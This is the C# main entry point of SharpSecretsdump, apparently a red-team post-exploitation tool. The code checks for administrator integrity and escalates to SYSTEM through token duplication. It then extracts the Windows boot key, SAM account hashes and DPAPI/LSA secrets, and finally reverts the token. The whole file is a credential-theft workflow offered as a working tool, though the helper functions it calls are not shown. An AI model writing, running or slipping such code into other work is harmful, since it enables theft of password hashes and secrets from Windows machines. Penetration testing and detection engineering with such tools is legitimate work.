using System;

namespace SharpSecretsdump
{
    class Program
    {
        static void Main(string[] args)
        {
            bool alreadySystem = false;

            if (!Helpers.IsHighIntegrity())
            {
                Console.WriteLine("You need to be in high integrity to extract LSA secrets!");
                Environment.Exit(0);
            }
            else
            {
                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                if (currentName == "NT AUTHORITY\\SYSTEM")
                {
                    alreadySystem = true;
                }
                else
                {
                    // elevated but not system, so gotta GetSystem() first
                    //Console.WriteLine("[*] Elevating to SYSTEM via token duplication for LSA secret retrieval");
                    if (Helpers.GetSystem() == false)
                    {
                        Console.WriteLine("Failed to elevate");
                        Environment.Exit(0);
                    }
                }
            }

            byte[] bootkey = LSADump.GetBootKey();

            Console.WriteLine($"[*] Target system bootKey: 0x{BitConverter.ToString(bootkey).Replace("-", "").ToLower()}");

            Helpers.GetSamAccounts(bootkey);
            LSADump.GetDPAPIKeys(true);

            if (!alreadySystem)
            {
                Interop.RevertToSelf();
            }
        }
    }
}
